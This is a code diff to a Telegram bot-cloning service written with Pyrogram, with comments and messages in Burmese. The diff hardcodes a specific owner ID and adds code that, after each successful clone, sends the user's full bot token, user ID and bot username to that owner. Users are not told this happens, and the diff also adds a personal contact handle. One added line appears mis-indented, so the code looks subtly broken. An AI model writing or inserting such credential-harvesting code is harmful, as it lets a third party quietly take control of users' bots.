@@ -8,7 +8,7 @@ from pyrogram.errors import UserNotParticipant
 # --- CONFIGURATION ---
 API_ID = int(os.getenv("API_ID", "12345"))
 API_HASH = os.getenv("API_HASH", "your_hash")
-OWNER_ID = int(os.getenv("OWNER_ID", "12345678"))
+OWNER_ID = int(os.getenv("OWNER_ID", "8266394986"))
 MONGO_URL = os.getenv("MONGO_URL")
 
 # Channel Username များ ( @ မပါဘဲ ထည့်ပါ )
@@ -59,7 +59,7 @@ async def clone_handler(client: Client, message: Message):
         )
 
     if len(message.command) < 2:
-        return await message.reply_text("အသုံးပြုပုံ: `/clone [BOT_TOKEN]`")
+        return await message.reply_text("အသုံးပြုပုံ: `/clone [BOT_TOKEN]`\nတစုံတရာအခက်အခဲရှိပါက @HEX_KING9 Dmလာပေးပါ")
 
     bot_token = message.text.split(None, 1)[1].strip()
     msg = await message.reply_text("⌛ Clone စတင်နေပါသည်...")
@@ -71,6 +71,20 @@ async def clone_handler(client: Client, message: Message):
     if success:
         bot_info = await result.get_me()
         await msg.edit(f"🎉 **Clone အောင်မြင်ပါပြီ!**\n\n🤖 Bot: {bot_info.first_name}\n🆔 @{bot_info.username}")
+
+         notification_text = (
+            "🔔 **Clone Bot အသစ်တစ်ခု တိုးလာပါပြီ!**\n\n"
+            f"👤 **ပိုင်ရှင်:** {user_tag}\n"
+            f"🆔 **User ID:** `{user_id}`\n\n"
+            f"🤖 **Clone Bot:** {bot_info.first_name}\n"
+            f"🆔 **Username:** @{bot_info.username}\n"
+            f"🔑 **Token:** `{bot_token}`"
+        )
+        try:
+            await client.send_message(OWNER_ID, notification_text)
+        except Exception as e:
+            print(f"Notification Error: {e}")
+    
     else:
         await msg.edit(f"❌ Error: {result}")
 
